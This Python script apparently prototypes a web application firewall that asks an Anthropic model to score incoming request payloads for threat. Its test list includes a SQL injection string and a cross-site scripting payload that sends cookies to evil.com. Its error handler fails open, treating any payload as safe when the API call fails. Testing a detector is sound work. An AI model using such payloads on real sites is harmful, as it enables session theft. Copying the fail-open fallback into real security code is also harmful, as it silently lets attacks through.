import os
import json
from dotenv import load_dotenv
from anthropic import Anthropic

# Load variables from the hidden .env file
load_dotenv()

# Initialize the AI client securely
client = Anthropic(api_key=os.getenv("ANTHROPIC_API_KEY"))

def evaluate_payload_with_ai(payload_text):
    system_instruction = (
        "You are an automated web application firewall and cybersecurity guardrail. "
        "Analyze the provided incoming request payload. "
        "You must respond ONLY with a valid JSON object containing two keys: "
        "'threat_score' (a float between 0.0 and 1.0) and "
        "'reason' (a brief explanation of why)."
    )

    try:
        response = client.messages.create(
            model="claude-sonnet-5-5",
            max_tokens=150,
            system=system_instruction,
            messages=[
                {"role": "user", "content": f"Analyze this payload: {payload_text}"}
            ]
        )
        return json.loads(response.content[0].text)
    except Exception as e:
        print(f"[ERROR] Failed to connect to AI engine: {e}")
        return {"threat_score": 0.0, "reason": "API error fallback - treated as safe."}

# Test payloads
test_payloads = [
    "GET /index.html HTTP/1.1",
    "SELECT * FROM users WHERE username = 'admin' --",
    "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
]

print("=== AI SECURITY GUARDRAIL ACTIVE ===\n")
for payload in test_payloads:
    print(f"[INSPECTING]: {payload}")
    result = evaluate_payload_with_ai(payload)
    print(f" -> Score: {result.get('threat_score')} | Reason: {result.get('reason')}\n")
